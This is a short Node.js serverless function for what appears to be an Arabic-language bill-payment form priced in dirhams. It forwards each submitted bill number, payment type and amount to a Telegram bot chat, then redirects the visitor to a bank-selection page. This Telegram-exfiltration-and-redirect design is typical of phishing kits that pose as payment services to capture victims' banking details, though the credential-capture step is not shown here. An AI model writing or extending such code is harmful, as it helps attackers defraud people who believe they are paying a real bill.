const axios = require('axios');

exports.handler = async function(event) {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const params = new URLSearchParams(event.body);
        const bill_number = params.get('bill_number') || 'N/A';
        const amount = params.get('amount') || 'N/A';
        let payment_type = params.get('payment_type_select') || '';

        if (payment_type === 'مدفوعات أخرى') {
            payment_type = params.get('payment_type_manual') || 'مدفوعات أخرى (لم يتم التحديد)';
        }

        const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

        const message = `تم استلام عملية سداد جديدة:\n\nرقم الفاتورة: ${bill_number}\nنوع السداد: ${payment_type}\nالمبلغ: ${amount} درهم`;

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            await axios.post(url, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
            });
        }

        return {
            statusCode: 302,
            headers: {
                'Location': '/bank_select/bank.html',
            },
        };
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: `Error: ${error.message}`,
        };
    }
};